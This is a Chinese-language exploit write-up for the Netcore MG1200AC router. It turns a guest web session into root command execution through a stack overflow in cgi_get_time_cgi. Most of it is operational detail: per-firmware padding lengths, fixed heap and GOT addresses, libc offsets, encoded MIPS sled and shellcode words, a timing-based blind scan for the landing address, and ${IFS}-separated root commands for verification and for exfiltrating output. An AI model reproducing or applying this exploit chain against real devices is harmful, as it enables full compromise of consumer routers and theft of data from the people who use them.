# Netcore MG1200AC：guest 会话到 root 命令执行

`/lib/cgi.so` 的 `cgi_get_time_cgi` 用 `sscanf("%s")` 把 `timer_day` 表单值拷进 70 字节的栈帧，覆盖该函数的保存 `$ra`。本文给出该原语、让它可以原样执行的进程内存布局、载荷与盲探测落点的方法、数据回传通道，以及三个固件版本之间的差异。

| --- | --- |
| 设备 | Netcore MG1200AC（Realtek RTL8197F，MIPS32 o32 LE，101 MB RAM） |

| 所需权限 | `guest` web 账号 + TCP/80；无 CSRF 秘密（`token_id` 来自登录响应）、无需用户交互、无地址泄漏 |
| 结果 | uid 0 执行任意命令，一次 POST |

## 1 漏洞原语

### 1.1 触发路径

`cgi_get_time_cgi` 由 `wire_bas_ap_set_cgi` 与 `radio_power` 宿主的分发逻辑调用，两者都来自 guest 可达的 POST。反编译出的门条件（V1.0.7）：

```c
nptr = (char *)get_form_value(a1, "timer_enable");
v9 = atoi(nptr);
if ( v9 >= 4 ) return 1;
if ( v9 > 0 ) {
    if ( !strcmp(get_form_value(a1,"week_rate"),"1") ) {
        v10 = atoi(get_form_value(a1,"start_hour"));   /* must be 0..24 */
        v11 = atoi(get_form_value(a1,"start_minute")); /* must be 0..59 */
        v12 = atoi(get_form_value(a1,"end_hour"));
        v13 = atoi(get_form_value(a1,"end_minute"));
        if ( v13 && v12 && v11 && v10 ) {
            form_value = (char *)get_form_value(a1, "timer_day");
            memset(&v14, 0, 0x46u);
            sscanf(form_value, "%s %s %s %s %s %s %s",
                   &v14, &unkFFB2, &unkFFB6, &unkFFBA, &unkFFBE, &v18, &v17);
```

门条件全部由表单控制，且在三个版本中相同：`timer_enable` 解析为 1，四个 `start_*`/`end_*` 字段存在且非零，`timer_day` 非空。

### 1.2 各版本的栈参数

`nm -D` 显示三个 `/lib/cgi.so` 都导出 `cgi_get_time_cgi`；V1.2.7 与 SH-V1.2.1 的反汇编逐指令相同（同一次构建）。

| | V1.0.7.54189 | V1.2.7.57422 | SH-V1.2.1.331 |
| --- | --- | --- | --- |
| 地址 / 大小 | `0x6810` / 1548 | `0x9058` / 992 | `0x9058` / 992 |
| 缓冲区 | `$fp+0x58` | `$sp+0x30` | `$sp+0x30` |
| `memset` 长度 | `0x46` | `0x46` | `0x46` |
| 保存的 `$ra` | `$sp+0xa4` | `$sp+0x9c` | `$sp+0x9c` |
| **到 `$ra` 的填充** | **76** | **108** | **108** |
| `%s` 槽位间距 | 10 字节 | 10 | 10 |
| 本函数栈金丝雀 | 无 | 无 | 无 |

V1.2.x 的 `cgi.so` 确实链接了 `__stack_chk_guard`/`__stack_chk_fail`（V1.0.7 两者都不引用），但只有 15 个函数受保护：`main`、`urldeunicode`、`dump_unicode`、`dump_utf8`、`hchartoi`、`parse_mac`、`cgi_IsIpStr`、`cgi_get_charge_cgi`、`cgi_get_gtime_cgi`、`cgi_get_multi_value`、`cgi_print_dst_ip`、`cgi_print_ip_union`、`cgi_print_time_union`、`add_web_style`、`ping`。`cgi_get_time_cgi` 不在其中。

### 1.3 覆盖范围

7 个 `%s` 的槽起点（V1.2.x/SH）为 `$sp+0x30,0x3a,0x44,0x4e,0x58,0x62,0x6c`，间距 10 字节；V1.0.7 的槽位与到 `$ra` 的距离见 §1.2。所有写法服从同一条规则：**每个字节归最后写到它的那一笔所有**，而每一笔都是从自己槽位起点起**连续**的一段，段尾那个 NUL 本身就是一次写 `0x00`。于是可写的字节只有两类——内容字节（非空白、非 `00`）与 NUL 代写的 `0x00`，区别只在 0 由谁供给、供给几个。

**单 token。** 只给一个 token，其值形如

```
timer_day = [76（V1.0.7）或 108（V1.2.x/SH）个非空白字符][目标地址低 3 字节]
```

结束 NUL 恰好落在 `$ra` 最高字节之后，一次写入把 `$ra` 钉成 `0x00xxxxxx`：覆盖 `0x004xxxxx` 的全部固定落点（text、GOT、堆），代价是低 3 字节里一个空白与 `00` 都不能有。

**"最后写作者"由 token 数决定，不由槽号决定。** 只给 i 个 token，`sscanf` 消耗完输入即停，槽 i 就是最后写作者，其后各槽从未被写，所以它的值可以任意拉长跨过 `$ra`；槽 6 配 6 个 token 与槽 7 完全等价（只是起点在 `$sp+0x62`、距 `$ra` 58 字节）。拉长到 NUL 落在 `$ra` 之后（`$sp+0xa0`）时四字节全为内容字节，即"`$ra` 全部可控"——前提是每字节避开 `00`、`09–0d`、`20`（这是 `timer_day` 被 `%s` 拷贝才有的限制，载体字段不受此限，见 §4.5）。

**叠 0：0 的位置与个数都不是边界。** 每个 token 都供一个 NUL，未被更晚写入覆盖的都存留。因为写入区间连续、且后写的槽起点仍低于 `$ra`，把若干 token 按**终点从高到低**排列（最高者最早写、最矮者最后写）就能逐个落 0：最高的那段内容由最早的槽写完，其 NUL 落在 `$ra` 之外（写进保存的 `$fp` 一带，无害，见本节末）；此后每个更晚、更矮的 token 恰好擦掉前一笔的最后一个内容字节，并落出自己的 0。单 token 只是"只用最后一笔 NUL"的特例。可达形状随 token 数迅速铺开：

| 用到的 token 数 | `$ra` 四字节可落的 0/内容形状（`0` = NUL 落点，`C` = 内容字节） |
| --- | --- |
| 1 | `CCC0`、`CCCC` |
| 2 | 8 种（含 `CC00`、`C0C0`） |
| 3 | 14 种（含相邻 0 的 `00CC`） |
| 4 | 全部 16 种（含 `0000`，无实践意义） |

例：`0x77b40000`（小端 `00 00 b4 77`）用三笔——槽 1 写内容字节 `b4 77` 并把 NUL 送到 `$ra` 之外，槽 2 止于次低字节落 0，槽 3 止于 `$ra` 起点落 0。至此只剩**一条**边界：非零内容字节须避开 `09–0d`/`20`。

**所以 PIE 宿主并未在原理上关闭路径，但也仅此而已。** MSB 非 0 的 `0x77xxxxxx`/`0x7fdxxxxx` 一样写得出来；挡路的是**拿不到地址**（§3 的逐进程随机化、§11.1），泄漏或爆破的需求不因拼装技巧而消失。

本工具只用单 token 形状：落点候选凡低 3 字节含 `00` 或空白的都被跳过（粗扫窗口的 48 个候选里是 `0x00420008` 与 `0x00422008` 两个），而滑撬本就吸收对齐与落点偏差，简单模型已足够——叠 0 只在必须精确命中一个含 0 的地址时才有价值。

共享返回块先用 `$fp` 恢复 `$sp`，再重载 `$ra`/`$fp` 并 `addiu $sp,$sp,0xa8`，所以 `$sp` 不受被改写的 `$fp` 影响，仍指向该 CGI 自身有效的可写栈；劫持无需栈迁移即可执行 `fork`/`execve`。

## 2 路由与访问控制

三个固件的 boa 路由表逐字节相同：

```
^/router/\w+\.cgi$              -> /web/cgi-bin/cgitest.cgi
^/app/(\w+)/(\w+/)*\w+\.cgi$    -> /var/app/%s/webs/app.cgi
^/webnoauth/\w+\.cgi$           -> /web/webnoauth/na.cgi
```

`/web/router/wire_bas_ap_set.cgi` 不是 squashfs 中的文件，而是路由别名。`/etc/inittab` 之外，`etc/rcS` 第 47–52 行把每个 `/app/*` 软链到 `/var/app/*`，因此 `POST /app/radio_power/radio_power.cgi` 被交付给该宿主。

| 入口 | 宿主 | ELF 类型 | ACL 模式 |
| --- | --- | --- | --- |
| `/router/wire_bas_ap_set.cgi` | `/web/cgi-bin/cgitest.cgi` | V1.0.7 `ET_EXEC`；V1.2.7 与 SH 均为 `ET_DYN`(PIE) | `0x6`（三版相同） |
| `/app/radio_power/radio_power.cgi` | `/var/app/radio_power/webs/app.cgi` | `ET_EXEC @ 0x00400000`（三版均如此） | `0xff` |

ACL 是"按用户等级的位图"（`mode >> cur_user.level & 1`），因此 `0xff` ⊇ `0x6`；新版本没有收紧任何一项。`cfg/umconfig.txt` 三版相同，只有一个账号（`guest`，属 `root` 组、`priv=4`），`access` 表只有一条 `name=/` 授给 `root` 组——**位图之外没有第二道页级授权**。而 `/router/*.cgi` 这一族对 guest 可达是 §8.1 实测过的（本链在 V1.0.7 上就是走这个宿主），重启页正落在这一族里（§10）。

`radio_power` 宿主到达 `cgi_get_time_cgi` 的条件（入口 `0x4012f0`，经修正延迟槽的 BFS 在 1708 节点 / 278 延迟槽上验证）：

* `action=add` 或 `action=mod`——**不是 `not set`**；`action=set` 在 `0x4014b0` 把 `$s2` 清零，两条 `beq $s2,1/3` 都不成立。
* `idx`、`power`、`timer_enable` 均非空（`0x401708 beqz $s8`、`0x401710 beqz $v1`、`0x40171c bnez $a0`）。
* `nc_ipc("/tmp/rp_ipc", …)` 返回 0（`0x401534 bnez $v0,0x401d6c`），即 `radio_power_app` 守护进程必须在应答（`app.json`: `bin_start=./radio_power_app`, `start_reboot=yes`）。
* 其后 `0x401540/0x401548 beq $s2,1|3 -> 0x4017e0` → 若干 `atoi` → `0x40183c jalr cgi_get_time_cgi`，同一个表单句柄传入（`0x401834 move $a1,$s0`）。

`wire_bas_ap_set_cgi` 侧的调用点：V1.2.7 `+0x204`/`+0x43c`，SH `+0x204`/`+0x49c`。

## 3 进程内存布局

被利用 CGI 子进程 `/proc/<pid>/maps` 的采样（V1.0.7），以及 V1.2.7/SH 上 `radio_power` 宿主的对应值：

```
V1.0.7  00400000-00488000 r-xp  /web/cgi-bin/cgitest.cgi     # ET_EXEC, fixed
        00494000-00498000 rw-p  /web/cgi-bin/cgitest.cgi     # .data/.bss/GOT, fixed, writable
        00498000-004b0000 rwxp  [heap]                       # 另一例: 004a0000-004b8000
        77xxx000          r-xp  /lib/cgi.so, libc.so.0, ...   # 仅共享对象被随机化
        7fd08000-7fd2c000 rwxp  [stack]

V1.2.7  00400000-00404000 r-xp  /var/app/radio_power/webs/app.cgi
  /SH   ...(rw-p)...     -> 0x00414000
        00414000-...     rwxp  [heap]      # 基址固定，末端随值大小增长
```

* `randomize_va_space=1` 只随机化栈与 mmap，不随机化 brk；对 `ET_EXEC` 宿主而言 brk 紧跟 bss，因此堆是一块**固定地址的 rwx 区域**。V1.0.7 两个样本的基址分别是 `0x00498000` 与 `0x004a0000`，所以扫描窗口取整个 `0x00498000–0x004b8000` 而不是某个猜测的基址。
* 该内核不会把数据段标记为不可执行：堆与栈都是 `rwxp`。
* `app.cgi` 的 `ET_EXEC` 布局（三版相同）：text LOAD `0x00400000`，RW LOAD 与 `_end` 见下表；`_end` 向上取整一页即 brk 起点。

| | text LOAD | RW LOAD | `_end` | brk 起点 |
| --- | --- | --- | --- | --- |
| V1.0.7.54189 | `0x00400000` | `0x00413154` | `0x0041dcf0` | ~`0x0041e000` |
| V1.2.7.57422 | `0x00400000` | `0x004126f4` | `0x00412810` | ~`0x00413000` |
| SH-V1.2.1.331 | `0x00400000` | `0x004126f4` | `0x00412810` | ~`0x00413000` |

* 实测的堆末端随表单值大小变化：1280 字节的值见过 `0x0041c000`，3000 字节见过 `0x00420000`。因此 V1.2.x/SH 的扫描窗口取 `0x00414008–0x0042c008`。
* `/lib/cgi.so`（样本 `0x77ed0000`）与 `/lib/libc.so.0`（样本 `0x77b40000`）逐进程随机化，这决定了载荷必须在被劫持进程内解析 libc（见 §4）。
* 每个表单值都由 `cgi.so` 先 url 解码进**各自独立的堆缓冲区**。用 `0x01..0xff` 逐字节探测可知解码后的缓冲区保留除 NUL 以外的所有字节，包括空白与高位字节。
* 单个字段的体积上限：url 解码后的值 4096 B 被接受（`["SUCCESS"]`），6000 B 被拒绝（`{"err_no":"2","err_msg":"parameter is null"}`）。
* 结论：固定地址的 rwx 堆 + 非 PIE 的固定 GOT，使该利用不需要 ROP、不需要改写 GOT、不需要任何泄漏——`$ra` 直接跳进堆。

## 4 平台约束（硬件实测）

本节按条目编号引用（下文与代码注释里的 §4.1 … §4.8 即下列 8 条）。

1. **自修改代码不可用。** RTL8197F（MIPS32 r2，24Kc 级）的 L1 I/D 不一致。把计算出的 `syscall` 字（`0x0000000c`）写进 rwx 堆再跳过去，执行的仍是陈旧的 I-cache 行；用户态 `Hit_Writeback_Inv_D` + `Hit_Invalidate_I`（`bf55ffe8` / `bf50ffe8`）也无法发布。对照：同一地址上，"滑撬 + 自旋"如期挂住，而"先存入一段自旋再跳过去"立即死亡 ⇒ 落点正确、SMC 不可用。
2. **libc 地址既不能硬编码也不能跨请求泄漏。** 每次 CGI 调用都是新进程，libc 每次随机（两个样本 `0x772a4000`、`0x7701c000`）。解析必须发生在被劫持进程之内：劫持点上 `$gp` 仍指向 `cgi.so` 数据段，而 `cgi_get_time_cgi` 序言通过某个 GOT 槽调用过 `memset`，该槽因此已被解析。
3. **懒绑定使 `$gp` 锚点在 V1.2.x 失效。** V1.2.7/SH 的 `cgi.so` 采用懒 MIPS 绑定：`readelf -r cgi.so` 有 8 条 `R_MIPS_REL32`、没有 `JMP_SLOT`；`objdump -d --section=.MIPS.stubs` 显示所有导入共用同一条 `lw $t9,-0x7ff0($gp)`（那是解析器），符号编号放在 `$t8`。因此读 `$(gp-0x7f20)` 得到的是 `cgi.so` 的 stub 地址而非 `memset`。改用**非 PIE 宿主自己的 GOT**：`app.cgi` 无重定位（`readelf -r` 为 0 条），其调度过程已解析过若干 libc 槽。

   | 固定 GOT 槽 | 实机值 | libc 符号 | libc 内偏移 |
   | --- | --- | --- | --- |
   | `0x00412788` | `0x77a6cd30` | `strcmp` | `0x3cd30` |
   | `0x00412794` | `0x77a8f804` | `__uClibc_main` | `0x5f804` |
   | `0x004127bc` | `0x77a9c270` | `memset` | `0x3c270` |

   实际使用的是 `memset` 槽：`system`、`exit` 由它加固定偏移得到，无需任何泄漏。三个 rootfs 的 `/lib/libc.so.0` 逐字节相同（md5 `6de515446369ec0bcfd5c2294759f116`），所以一张偏移表覆盖全部版本：`memset 0x3c270`、`system 0x60320`、`exit 0x5bb40`、`write 0x0f70c`。
4. **MIPS PIC 调用要求目标在 `$t9`。** 被调方会用 `$t9` 重算自己的 `$gp`；而 `jalr $ra,$t9` 的第三字节是 `0x20`（空白），所以序列必须是 `or $t2,$t1,$t9` 再 `jalr $ra,$t2`。把目标留在别的寄存器里会让 libc 在第一次访问全局量时死亡，症状是"载荷跑了但什么也没发生"。
5. **`0x20` 会静默截断表单值。** 某些指令编码出一个空格（例如 `beq $s1,$zero,-2` 的第 2 字节、部分 `or` 的第 1 字节），值随之变短、堆块大小改变，一整轮扫描可以因此完全落空。**就载体字段而言**`0x09–0x0d` 可用（`jalr` 的 `funct=9` 不可避免且无害），而 `timer_day` 自己按 `%s` 的规则避开全部空白（§1.3）。编码器只允许 `jalr` 携带 `0x09`，其余空白字节一律拒绝。
6. **boa 丢弃被信号杀死之 CGI 的输出。** 保持 stdout 管道打开的请求会把连接挂住 8–40 秒（起服务类命令即如此，例如换过 busybox 的板子上的 `httpd`/`nc`）。因此载荷以 libc `exit()` 收尾（复用 `system()` 留在 `$a0` 的返回值——用 R 型指令清零 `$a0` 会编出 `0x20`），需要取回输出的命令只能写文件。
7. **没有"既可写又被服务"的目录。** `/var/app/*` 只读（写入静默失败）、`/web` 是 squashfs 文档根、`/tmp` 可写但不被静态服务；`grep -q <模式> <文件> && sleep N` 的门控只能每次请求带回 1 比特。三个库存镜像的 `/bin/busybox` applet **名单逐项相同**（表起于 `0x483ed8`，SH-V1.2.1 起于 `0x483f48`；12 字节一项 `{name, main, flags}`，共 95 项，按字典序 `[` … `zcat`），其中**没有** `id`、`nc`、`httpd`；V1.0.7 与 V1.2.7 连 main 指针都逐字一致，SH-V1.2.1 有 29 项因镜像内位移而不同，但 `telnetd` 的 main 在三个镜像里都是同一个 `0x42b240`，反汇编是厂商留下的空桩 `while (1) sleep(-1);`（`addiu sp,sp,-32` / `sw ra,28(sp)` / `jal sleep@plt`＋`li a0,-1` 延迟槽 / `j` 回环），永远走不到 `socket()/bind()`；`/sbin/telnetd` 只是指向 `/bin/busybox` 的软链。所以命令输出无法回到响应体，库存固件上也不存在任何可用的网络 shell 原语（回连一个交互 shell 或绑听都不行）。这否定的只是"交互 shell"：把输出**发出去**的反向数据通道确实存在并已实测，见 §7.2。
8. **设备侧 shell 不在此链路径上。** 串口控制台与 telnet 只用于观察，验证一律仅经 HTTP 完成；串口 shell 的来源见 §10 与 §11.2。

## 5 载荷

载荷受三重限制：溢出字段必须是**无空白**的单个 token（`%s`）；每个指令字必须**无 NUL**；落点地址无法预先精确知道。

### 5.1 几何

| 名称 | 值 | 作用 |
| --- | --- | --- |
| 载体字段 | `zzz`，处理函数从不读取 | 承载滑撬、代码与命令 |
| 值长度 | `SIZE = 0x1000` | 固定堆块大小，从而固定布局 |
| 滑撬 | `SLED = 0x800` 个 `41 41 08 25` | `addiu $t0,$t0,0x4141`：4 字节周期、无访存、无控制流、不碰 `$a0`/`$ra`。任何 4 字节对齐的落点都会滑进代码 |
| 命令位置 | `DATA_POS = 0x204` = 516（`$s0` 相对） | 命令串在载荷内的起点；`$s0` 是 `bltzal` 拿到的 `PC+8`，即滑撬之后代码的入口 |
| 代码预算 | `DATA_POS + 8` = 524 字节 | 滑撬之后、命令串之前可放的指令字节数（那 8 字节是 `bltzal` 与它的延迟槽） |
| 命令长度上限 | `CMD_MAX = 0x400` | 命令区有 `SIZE − SLED − 8 − DATA_POS` = `0x5F4` = 1524 字节，取回流水线（写文件→连回→删）整条都写在这一段里；`CMD_MAX` 只取其中 1024，余下给尾部 `${IFS}` 填充与代码不超过滑撬之后的预算 |
| 终止 | 命令尾部补 `${IFS}`，语义上等价于换行 | 值长度必须恒定，而 `sb` 的位移低位不能是 `00`/`09–0d`/`20` |

命令串不能以 NUL 结尾（表单值按 C 字符串解码与拷贝），因此使用 `;#`：`#` 之后该行余下内容成为 shell 注释，缓冲区内其后的填充字节被忽略——前提是缓冲区中不含 `0x0a`。

### 5.2 自定位代码

`lui $r,0x0049`/`0x004a` 含 NUL，所以堆地址无法编进指令；载荷用自取地址避免任何绝对地址。`cgitest.cgi` 宿主（`ET_EXEC`、有 `system@plt`）的形式是：

```
+0x000  bltzal $zero,-1        ff ff 10 04   ; 条件永假不跳转，但仍链接 $ra = PC+8
+0x004  addiu  $a0,$ra,0x101   01 01 e4 27   ; 延迟槽：$a0 = +0x109 = 命令串
+0x008  jal    0x004059f0      7c 16 10 0c   ; system@plt
+0x00c  addiu  $t0,$t0,0x4141  41 41 08 25   ; 延迟槽，无副作用
+0x109  命令串
```

`0x0c`（`jal` 编码中出现）对 `%s` 而言是空白，但它位于**载体字段**——载体字段没有空白限制，实测也能通过解码存活。

针对 `radio_power` 宿主（无 `system` 导入、`cgi.so` 懒绑定）的现行形式把 `system@plt` 换成 §4.3 的固定 GOT 锚点，四指令、无访存地把槽地址物化进寄存器，而不是把它编进立即数（`load_got()`）：

```
lui   $t8,0x4129      # 3c184129  -> 0x41290000
srlv  $t8,$t8,$t6     # 01d8c006  -> 0x00412900        ($t6 = 8)
addiu $t8,$t8,-0x33   # 2718ffcd  -> 0x004128cd = GOT + 0x111
lw    $t9,-0x111($t8) # 8f19feef  -> libc memset
```

槽地址只能精确到 ±一个滑撬长度（这正是滑撬存在的理由），而 `0x004127bc ± 0x100` 读到的是**相邻的 GOT 槽**——一次完美落点之后跳到垃圾。因此载荷必须端到端位置无关：唯一重要的地址是 `$ra` 去哪里，其余由滑撬吸收。

后续步骤即 `subu $t2,$t2,0x3c270`（libc 基址）→ `addu` 到 `system`/`exit` → `or $t2,$t1,$t9` → `jalr $ra,$t2`（见 §4.4），`$a0` 指向命令串，`system()` 返回后以 `$a0` 中的返回值调用 `exit()`（见 §4.6）。

## 6 落点探测与预言机

链路上唯一可用的观测是 **HTTP 响应时间**（无 `/proc`、无串口、无 telnet）。

### 6.1 请求长度必须恒定

堆布局随请求大小移动：同一形状的正文在不同长度下把缓冲区从 `0x004ac908` 移到 `0x004acd48`，重启后又到 `0x004add40`。因此两个攻击字段都按字节百分号编码（每个字节写成 `%02X`，字母数字也不例外），使每一次探测与真实载荷**长度完全一致**（V1.0.7 上是 3527 字节）。同时这也让载荷值避开了 url 解码阶段的空白截断（§4.5）。

### 6.2 计步自旋与标定

落点探针是**载荷内的计步自旋**（`spin(count)`），三个固件一律如此：它不需要任何应用程序参与，也不依赖 `system()` 的返回值能否被观测，于是落点测量与 libc 锚点互相独立（§4.1、§4.3）。用 `busybox sleep 2` 作探针时同样能区分（命中约 2.03 秒、未命中 SIGSEGV 约 0.02 秒），但那测的是应用程序而不是载荷：

```
li $s6,<count>  ; addiu $s6,$s6,-1 ; bne $s6,$zero,-2   # 延迟槽即 addiu 本身
```

该核心上约 4 周期一次迭代（999 MHz），延迟与计数严格线性，实测：`0x03030303` → 0.24 秒，`0x0C0C0C0C` → 0.88 秒，`0x30303030` → 3.48 秒；崩溃成本 0.03–0.05 秒。**阈值必须在同一次运行内标定**，不能硬编码：过高的阈值会把真实命中读成未命中。

两条规则排除误报：一次超时会带回 25 秒，比任何阈值都大，因此传输失败一律以**负耗时**上报，绝不可能被当成落地（而超时恰恰最容易发生在载荷真正运行、管道被握住的时刻，见 §4.6）；某个地址的慢回复也只有**第二次仍然慢**才算命中，因为 boa 忙时任何请求都可能变慢——扫描、协商、以及"已知瞄点全部失手后再打一发真实命令"这三条路径都遵守它。miss 基线取两次探测里**最快**的一次，避免一次偶发慢请求把整轮阈值抬上去。

"阈值必须现测"带来两条约束：

* **两类探针的落地时长不可互换。** 计步自旋的落地约 3.48 秒，门控 `sleep N` 的落地约 N 秒。所以"已知瞄点失手后重扫"不能沿用调用方的门控阈值 `max(0.5, N/2)`：设备慢到把门控顶到 8 秒（或有人直接 `--secs 8`）时该阈值是 4.0 秒，**大于自旋落地时长**，真实落地会被全量读成未命中，重扫徒劳并白付两趟扫描的崩溃请求。重扫前重新标定，取计步自旋自己的阈值。
* **标定探针要落在载体永远到不了的地方。** 标定要的是"确定未命中"的时长，所以两个探点都在扫描窗口**之下**（`0x00410108`、`0x0040c108` < `HEAP_LO`）。落在窗口内的探点（如 `0x0041c108`）会被载体覆盖，一旦命中就把 miss 基线抬到约 3.5 秒，只剩另一发的 `min()` 兜底。两个窗口之下的探点各连发三次都是 **0.02 秒**（`0x00410108` 0.02/0.03/0.02，`0x0040c108` 0.02/0.02/0.02）。

### 6.3 扫描

命中条件是 `V ≤ E ≤ V+SLED`（`V` 为载体缓冲区基址，`E` 为 `$ra` 目的地址），因此粗扫可以正好按滑撬长度步进而无重叠、无缝隙；跳过低三字节含 `%s` 终止字节的候选。V1.2.x/SH 用两趟：先以 `0x400` 步长（配 `0x800` 滑撬）粗扫 `0x00414008–0x0042c008`，再在命中的载体附近细扫。

命中集合恰为 `[V, V+SLED]`，其最小元即载体基址。基址由**二进制 + 载体形状**共同决定：1280 字节的载体值（滑撬 `0x400`）在 V1.2.7 与 SH-V1.2.1 上都是 **`0x0041a208`**，重启后不变；4096 字节的值（滑撬 `0x800`）在同一块 SH 板上是 **`0x0041b808`**。换值长或滑撬宽度都要重扫。pad 由设备自报的版本串选定（§7.2 第 15 条），猜错一个 pad 的代价是一整轮堆扫描。瞄点取**被证实落地的地址本身**（滑撬起点一侧），其余偏差由滑撬吸收；不取中点。

**载体在两个堆槽之间交替。** 同一个 blob 打同一个地址会得到 `[命中, 未命中, 命中]`；两趟扫描可以同时给出 `0x0041b808` 与 `0x0041e808`——相差约 `0x3000` 的两个基址。因此单一瞄准大约两次里中一次，正确做法是**在全部观测到的瞄准地址上重试**（扫描本身也跑两趟），而不是重新调地址或改命令拼写。重启后重扫得到的还是这一对基址（每个命中都由第二次慢回复确认），而只给 `--addr` 单点时三次重试可以全 miss ⇒ 交替是稳定行为。

作为与堆无关的对照，`$ra` 指向代码段 gadget 时同一原语的结果：

| `$ra` 指向 | 指令 | 响应 |
| --- | --- | --- |
| `0x00459504` | `li $a0,2 ; jal sleep` | 2.03 s |
| `0x004137f4` | `li $a0,1 ; jal sleep` | 1.04 s |
| `0x00459508` | 只有 `jal`，`$a0` 为垃圾 | 0.02 s |
| `0x004acd48`（上一次启动的堆） | — | 0.02 s |

### 6.4 门控预言机与 `${IFS}` 边界

响应时间只能回答"载荷跑没跑"，要区分权限与内容，就把延迟**门控在一个只有 root 能成功的动作或一次内容匹配**上。下表在 8 秒门控下取得（门控秒数由量决定，见本节末）；判定形状不变：`sleep` 直接绑在被问的那个动作上，阴性对照与之同形。

| 触发的命令 | 响应 | 结论 |
| --- | --- | --- |
| `kill${IFS}-0${IFS}1${IFS}&&${IFS}sleep${IFS}8` | **8.22 s**（重复 8.15 s） | PID 1 是 `init`，非 uid 0 需要 `CAP_KILL` ⇒ 以 root 执行 |
| `kill${IFS}-0${IFS}1${IFS}&&${IFS}sleep${IFS}0` | 0.17 s | 延迟来自门控而非命令本身 |
| `kill${IFS}-0${IFS}999999${IFS}&&${IFS}sleep${IFS}8` | 0.14 s | 阴性对照 |
| `grep${IFS}-q${IFS}"Uid:[^0-9]*0"${IFS}/proc/self/status${IFS}&&${IFS}sleep${IFS}8` | **8.09 s** | 直接证据：子进程读到自己的凭证行是 uid 0 |
| `test${IFS}-f${IFS}/var/pwn_v127${IFS}&&${IFS}sleep${IFS}8`（先 `cat${IFS}/dev/null>/var/pwn_v127`） | **8.26 s** | 载荷能创建文件 |
| `test${IFS}-f${IFS}/var/nonexistent_xyz${IFS}&&${IFS}sleep${IFS}8` | 0.19 s | 阴性对照 |
| `cat${IFS}/proc/version>/tmp/v127.out` 后 `grep${IFS}-q${IFS}"Linux.version"${IFS}/tmp/v127.out${IFS}&&${IFS}sleep${IFS}8` | **8.08 s** | 文件存在且内容就是命令输出 |
| `test${IFS}-e${IFS}/var/diag.txt${IFS}&&${IFS}sleep${IFS}8` | 8.30 s / 缺失 | 用于判别镜像（见 §8.4） |

因此这是**以 root 身份执行任意命令并具备文件系统写入**，不只是延迟了的崩溃。

**门控的秒数由量决定。** 固定 8 秒会让每一次判定——包括"未命中"的第二次确认——都等满 8 秒，而门控只需要大于设备的普通响应延迟。工具的作法：先连发 3 条**只读**请求（同一个条目、`action=get` 配合法的 `timer_day`：这条只被 dispatch 层读取，不会走完 `action=mod` 的存储路径，§8.2），以最慢的一条当作这台机器此刻的 web 延迟，门控取它的 3 倍并夹在 `[2, 8]` 秒里；判定阈值仍是门控的一半，于是它随设备一起浮动：

| 只读请求实测 | 门控 | 阈值 | 阈值 / 普通应答 |
| --- | --- | --- | --- |
| 0.05 s | 2 s | 1.00 s | 20× |
| 0.20 s | 2 s | 1.00 s | 5× |
| 0.90 s | 3 s | 1.50 s | 1.7× |
| 1.20 s | 4 s | 2.00 s | 1.7× |
| ≥ 2.7 s | 需要 > 8 s | — | **直接报错**，由操作者指定 `--secs` 或等机器空闲 |

SH-V1.2.1.331 上 3 条只读请求全部被答，最慢 0.02–0.05 秒 ⇒ 门控取到 2 秒地板、阈值 1.00 秒；判定值是 `2.06–2.12 秒`（命中）对 `0.02 秒`（未命中）。`--secs N` 跳过测量、照给定值判；只有走热路径的 `run`/`push`（回连到达为判据、启动指纹仍然匹配，见 §7.2 第 14 条）整轮既不做这项测量、也不发那 3 条只读请求；它们一旦还要扫描或协商，就照旧先量。

命令串的 shell 层事实（前两条板上实测；后两条在本地 POSIX shell 上验证——解析规则与板上 `system()` 所用的 shell 同源，板上未复测）：

* `>` 必须紧跟路径：`>${IFS}/tmp/x` 是语法错误——带引号的 `${IFS}` 展开为空格+制表符+换行，于是文件从未创建，症状与"落点不对"相同。
* `test -w <目录>` 对 uid 0 无意义（它报告只读 squashfs `/web` 本身可写），要写文件再测其存在。
* `${IFS}` 只能分隔**词**，可以放在运算符（`;`、`|`、`&&`、`<`、`>`）之前，但**不能引出控制字**——`for`/`do`/`done`/`if`/`then` 是在展开之前的词法阶段按字面源词匹配的，所以 `for${IFS}x${IFS}in…` 得到的是 "for: not found"。
* 重定向的文件名后面也不能紧跟展开式（`</tmp/p${IFS}|cat` 会把 IFS 的空格/制表符吞进文件名而报 cannot open），要让文件名在字面运算符处结束（`</tmp/p|cat`）。同理 **`2>&1` 发不出去**：`${IFS}` 里的换行会把它从命令里切断，实测输出里混进了一个孤立的 `2`；所以 `run` 只收 stdout，设备上"applet 不存在"表现为空输出而不是报错。

因此本工具发出的每条命令串都只用简单命令串联（`…;…`、`…|…`），不含任何 `for`/`if`，也不留需要二次请求清理的后台进程。

## 7 数据回传通道

### 7.1 门控只能回答一位

由于 §4.7（没有"既可写又被服务"的目录），**在不外拨的前提下**取回一个写好的文件只有一种形状：`grep -q <模式> <文件> && sleep N`——一个请求回答"某行是否以该模式开头"这一位。工具把它留给 `--grep`：不需要监听端口，也是设备无法连回操作者时的兜底。整份输出走 §7.2 的外拨通道。

* 门控必须绑在 `grep` 本身，清理放在 `sleep` **之后**：`…; grep -q "^模式" p; rm -f p && sleep N` 里的 `&&` 只管得到 `rm`（uid 0 加 `-f`，永远成功），于是这一位问的不再是模式，而是"载荷跑没跑"——对任何模式都回答匹配。可用的形状只有 `(CMD)>p; grep -q "^模式" p && sleep N; rm -f p`。
* 一发请求只给一位，"没有延迟"就有两种成因：载荷没落地，或落地了而 `grep` 不答应。工具因此输出 `did not match, or the payload did not land`，不区分两者。
* 所以这一位的结论必须成对给出：同一命令、同一瞄点集合下，阳性与阴性模式各发一次（§6.4 的对照纪律）。只发阳性模式时，"模式匹配"与"门控没有绑在 `grep` 上"无法区分。同一份 `cat /proc/version`：`--grep "Linux version"` 答 2.12 秒，`--grep "zzz not in any file"` 不延迟。
* 模式里不能有空格（同样会截断值）：写成 `[[:space:]]`（该机 busybox 支持），其余不可发送字节写成 `.`。
* `--grep PATTERN` 按原样作为 BRE 传递（不转义元字符），所以它问的是"某行是否以该正则开头"，不是查找字面子串。
* `grep -q` 匹配**任意一行**，不是只匹配第一行；要在设备侧限定单行得先切 `sed -n 1p`。外拨通道不受此限（整份文件原样回来）。
* 自动构造模式时有两条 BRE 事实：逐字符括号化会改变匹配数（同一份样本 `^x*` 匹配 2 行而 `^[x][*]` 匹配 1 行），以及 `-` 必须放在字符集末尾，否则某个切片会拼成 `[_-+]` 区间。
